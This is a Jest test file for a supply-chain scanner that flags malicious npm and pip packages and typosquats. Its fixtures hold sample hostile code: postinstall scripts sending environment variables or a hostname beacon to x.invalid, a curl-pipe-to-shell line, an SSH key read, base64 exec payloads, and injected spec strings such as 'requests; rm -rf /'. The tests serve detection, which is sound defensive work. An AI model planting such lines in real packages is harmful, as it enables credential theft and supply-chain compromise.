import { afterEach, beforeEach, describe, expect, it, jest } from "@jest/globals";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { scanCode, typosquatOf } from "../src/package-risk-rules.js";
import { findNpmPackages, isPackageBlocked, scanInstalledPackages, scanNpmPackage } from "../src/package-scan.js";
import { attachVulnerabilities, installCommand, parseSpec } from "../src/packages.js";

let dir: string;
const put = async (path: string, text: string) => {
  await mkdir(dirname(join(dir, path)), { recursive: true });
  await writeFile(join(dir, path), text);
};
const npmPackage = (path: string, manifest: Record<string, unknown>, files: Record<string, string> = {}) =>
  Promise.all([put(join(path, "package.json"), JSON.stringify({ version: "1.0.0", ...manifest })), ...Object.entries(files).map(([f, t]) => put(join(path, f), t))]);
const ids = (findings: Array<{ id: string }>) => findings.map(f => f.id);

beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), "beam-pkg-")); });
afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

describe("package code rules", () => {
  it("flags malware shapes", () => {
    expect(ids(scanCode("eval(Buffer.from('ZXZpbA==', 'base64').toString())"))).toContain("pkg.decode_exec");
    expect(ids(scanCode("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))"))).toContain("pkg.decode_exec");
    expect(ids(scanCode("const u = 'https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP'"))).toContain("pkg.exfil_endpoint");
    expect(ids(scanCode("const body = JSON.stringify(process.env)"))).toContain("pkg.env_harvest");
    expect(ids(scanCode(Array.from({ length: 50 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=1;`).join("")))).toContain("pkg.obfuscated");
    expect(ids(scanCode(`const s = "${"\\x72\\x65\\x71".repeat(20)}"`))).toContain("pkg.obfuscated");
    expect(ids(scanCode("fs.readFileSync(path.join(os.homedir(), '.ssh/id_rsa'))"))).toContain("pkg.sensitive_files");
  });
  it("leaves ordinary library code alone", () => {
    const ordinary = [
      "const env = { ...process.env, NODE_ENV: 'production' }; spawn('node', ['x'], { env })",
      "const key = process.env.API_KEY; const res = await fetch('https://api.example.com', { headers: { key } })",
      "const fn = new Function('a', 'b', 'return a + b'); eval(code)",
      // A Latin-1 charset table is high-byte escapes, not encoded code.
      `const table = "${Array.from({ length: 64 }, (_, i) => `\\x${(0xa0 + i).toString(16)}`).join("")}"`,
      "const rc = path.join(os.homedir(), '.npmrc'); const r = await fetch(registry)",
    ];
    for (const code of ordinary) expect(scanCode(code).filter(f => f.severity !== "info")).toEqual([]);
  });
});

describe("scanning an npm package", () => {
  it("blocks install-time env theft and beacons, not a plain postinstall", async () => {
    await npmPackage("stealer", { name: "stealer", scripts: { postinstall: "node scripts/setup.js" } }, {
      "scripts/setup.js": "const https = require('https');\nconst data = JSON.stringify(process.env);\nhttps.request({ host: 'x.invalid' }).end(data);",
    });
    await npmPackage("beacon", { name: "beacon", scripts: { preinstall: "node -e \"require('./index')\"" } }, {
      "index.js": "const os = require('os');\nconst q = os.hostname() + os.userInfo().username;\nrequire('dns').lookup(q + '.x.invalid', () => {});",
    });
    await npmPackage("native", { name: "native", scripts: { install: "node-gyp rebuild" } }, { "index.js": "module.exports = require('./build/Release/addon.node')" });

    const stealer = await scanNpmPackage(join(dir, "stealer"));
    expect(ids(stealer.findings)).toEqual(expect.arrayContaining(["pkg.install_script", "pkg.env_harvest", "pkg.combo.install_env", "pkg.combo.env_exfil"]));
    expect(isPackageBlocked(stealer)).toBe(true);
    expect(stealer.level).toBe("CRITICAL");
    // Signals feed combinations but are never reported on their own.
    expect(ids(stealer.findings)).not.toContain("pkg.network");

    const beacon = await scanNpmPackage(join(dir, "beacon"));
    expect(ids(beacon.findings)).toContain("pkg.combo.install_beacon");
    expect(isPackageBlocked(beacon)).toBe(true);

    const native = await scanNpmPackage(join(dir, "native"));
    expect(ids(native.findings)).toEqual(["pkg.install_script"]);
    expect(isPackageBlocked(native)).toBe(false);
    expect(native.level).toBe("LOW");
  });

  it("flags curl in a lifecycle script and dependencies from outside the registry", async () => {
    await npmPackage("fetcher", { name: "fetcher", scripts: { postinstall: "curl -s https://x.invalid/a.sh | sh" }, dependencies: { left: "github:someone/left-pad" } });
    const scan = await scanNpmPackage(join(dir, "fetcher"));
    expect(ids(scan.findings)).toEqual(expect.arrayContaining(["pkg.install_fetch", "pkg.dependency_source"]));
  });

  it("only treats code as install-time when a lifecycle script runs it", async () => {
    await npmPackage("runtime", { name: "runtime" }, { "index.js": "const os = require('os');\nfetch('https://x.invalid/?h=' + os.hostname() + os.userInfo().username)" });
    expect(isPackageBlocked(await scanNpmPackage(join(dir, "runtime")))).toBe(false);
  });
});

describe("typosquats", () => {
  it("catches one-typo and separator lookalikes of popular names", () => {
    expect(typosquatOf("expresss", "npm")).toBe("express");
    expect(typosquatOf("crossenv", "npm")).toBe("cross-env");
    expect(typosquatOf("reqeusts", "pip")).toBe("requests");
    expect(typosquatOf("python_dateutil", "pip")).toBeUndefined(); // pip normalizes separators: same package
    expect(typosquatOf("express", "npm")).toBeUndefined();
    expect(typosquatOf("preact", "npm")).toBeUndefined(); // popular in its own right
    expect(typosquatOf("left-pad", "npm")).toBeUndefined();
  });
  it("blocks a brand-new typosquat, warns on an old one", async () => {
    await npmPackage("lodahs", { name: "lodahs" });
    const fresh = await scanNpmPackage(join(dir, "lodahs"), { direct: true, createdAt: new Date().toISOString() });
    expect(ids(fresh.findings)).toEqual(expect.arrayContaining(["pkg.typosquat", "pkg.new_package", "pkg.combo.fresh_typosquat"]));
    expect(isPackageBlocked(fresh)).toBe(true);
    const old = await scanNpmPackage(join(dir, "lodahs"), { direct: true, createdAt: "2015-01-01T00:00:00Z" });
    expect(isPackageBlocked(old)).toBe(false);
  });
});

describe("finding installed packages", () => {
  it("walks scoped, nested and pnpm layouts, skipping symlinks", async () => {
    await npmPackage("node_modules/a", { name: "a" });
    await npmPackage("node_modules/@s/b", { name: "@s/b" });
    await npmPackage("node_modules/a/node_modules/c", { name: "c" });
    await npmPackage("node_modules/.pnpm/d@1.0.0/node_modules/d", { name: "d" });
    await mkdir(join(dir, "node_modules/.bin"));
    const found = (await findNpmPackages(join(dir, "node_modules"))).map(p => p.slice(dir.length + 1)).sort();
    expect(found).toEqual(["node_modules/.pnpm/d@1.0.0/node_modules/d", "node_modules/@s/b", "node_modules/a", "node_modules/a/node_modules/c"]);
  });
  it("typosquat-checks direct dependencies only, and reads Python dist-info", async () => {
    await put("package.json", JSON.stringify({ dependencies: { expresss: "1.0.0" } }));
    await npmPackage("node_modules/expresss", { name: "expresss" });
    await npmPackage("node_modules/chalks", { name: "chalks" }); // transitive: not something anyone typed
    const site = ".venv/lib/python3.12/site-packages";
    await put(`${site}/evil-1.0.dist-info/METADATA`, "Metadata-Version: 2.1\nName: evil\nVersion: 1.0\n");
    await put(`${site}/evil-1.0.dist-info/RECORD`, "evil/__init__.py,sha256=x,10\nevil-1.0.dist-info/METADATA,,\n../../../bin/evil,,\n");
    await put(`${site}/evil/__init__.py`, "import base64\nexec(base64.b64decode(b'cHJpbnQoMSk='))\n");
    const { scans } = await scanInstalledPackages(dir);
    const by = (name: string) => scans.find(s => s.name === name)!;
    expect(ids(by("expresss").findings)).toContain("pkg.typosquat");
    expect(ids(by("chalks").findings)).not.toContain("pkg.typosquat");
    expect(by("evil").ecosystem).toBe("pip");
    expect(isPackageBlocked(by("evil"))).toBe(true);
  });
});

describe("beam add package", () => {
  it("accepts registry specs and refuses URLs, paths and option-like input", () => {
    expect(parseSpec("@scope/pkg@^1.2.0", "npm")).toEqual({ name: "@scope/pkg", range: "^1.2.0" });
    expect(parseSpec("requests==2.32.3", "pip")).toEqual({ name: "requests", range: "==2.32.3" });
    for (const bad of ["github:user/repo", "https://x.invalid/a.tgz", "./local", "--registry=evil", "a@1 && calc"]) expect(() => parseSpec(bad, "npm")).toThrow();
    expect(() => parseSpec("requests; rm -rf /", "pip")).toThrow();
  });
  it("installs the scanned version with the project's own package manager", async () => {
    expect(installCommand("npm", "zod", "3.23.8", { cwd: dir })).toEqual({ command: "npm", args: ["install", "zod@3.23.8"] });
    await put("pnpm-lock.yaml", "");
    expect(installCommand("npm", "zod", "3.23.8", { cwd: dir, dev: true })).toEqual({ command: "pnpm", args: ["add", "zod@3.23.8", "-D"] });
    expect(installCommand("npm", "zod", "3.23.8", { cwd: dir, global: true })).toEqual({ command: "npm", args: ["install", "-g", "zod@3.23.8"] });
    expect(installCommand("pip", "requests", "2.32.3", { python: "py" })).toEqual({ command: "py", args: ["-m", "pip", "install", "requests==2.32.3"] });
  });
});

describe("known vulnerabilities", () => {
  const originalEnv = { ...process.env };
  const originalFetch = global.fetch;
  const vuln = (overrides: Record<string, unknown>) => ({ id: "CVE-2026-1", slug: "cve-2026-1", url: "https://agentbeam.com/cve/cve-2026-1", title: "Prototype pollution", severity: "high", kev: false, epss: null, ecosystem: "npm", name: "a", version: "1.0.0", vulnerable: "< 1.0.1", patched: "1.0.1", files: ["a@1.0.0"], ...overrides });
  let sent: unknown;
  beforeEach(async () => {
    process.env = { ...originalEnv, BEAM_HOME: dir, BEAM_DATA_DIR: join(dir, ".beam-data") };
    delete process.env.BEAM_APP_TOKEN;
    await put(".beam-data/identity.json", JSON.stringify({ deviceSecret: "s", apiBase: "https://workspace.test" }));
  });
  afterEach(() => { process.env = { ...originalEnv }; global.fetch = originalFetch; });

  it("sends names and versions only, and a KEV entry makes the package critical", async () => {
    await npmPackage("a", { name: "a" }); await npmPackage("b", { name: "b", version: "2.0.0" });
    global.fetch = jest.fn(async (_url: string | URL | Request, init?: RequestInit) => {
      sent = JSON.parse(String(init?.body));
      return Response.json({ checked: 2, vulnerabilities: [vuln({}), vuln({ id: "CVE-2026-2", name: "b", version: "2.0.0", kev: true, severity: "medium" })], database: { generatedAt: "x", advisories: 10 }, remaining: 98, resetAt: "2026-11-01T00:00:00.000Z" });
    }) as typeof fetch;
    const scans = [await scanNpmPackage(join(dir, "a")), await scanNpmPackage(join(dir, "b"))];
    const notes: string[] = [];
    expect(await attachVulnerabilities(scans, notes)).toHaveLength(2);
    expect(sent).toEqual({ packages: [{ ecosystem: "npm", name: "a", version: "1.0.0", file: "a@1.0.0" }, { ecosystem: "npm", name: "b", version: "2.0.0", file: "b@2.0.0" }] });
    expect(scans[0]!.risk).toBe("high"); expect(isPackageBlocked(scans[0]!)).toBe(false);
    expect(scans[1]!.risk).toBe("critical"); expect(isPackageBlocked(scans[1]!)).toBe(true);
    expect(notes).toEqual([]);
  });
  it("skips with a note when the machine isn't connected or the feature is off", async () => {
    await npmPackage("a", { name: "a" });
    const scans = [await scanNpmPackage(join(dir, "a"))];
    global.fetch = jest.fn(async () => Response.json({ error: "App monitoring is turned off for this workspace." }, { status: 403 })) as typeof fetch;
    const notes: string[] = [];
    expect(await attachVulnerabilities(scans, notes)).toEqual([]);
    expect(notes[0]).toContain("turned off");
    await rm(join(dir, ".beam-data/identity.json"));
    await attachVulnerabilities(scans, notes);
    expect(notes[1]).toContain("beam connect");
  });
});
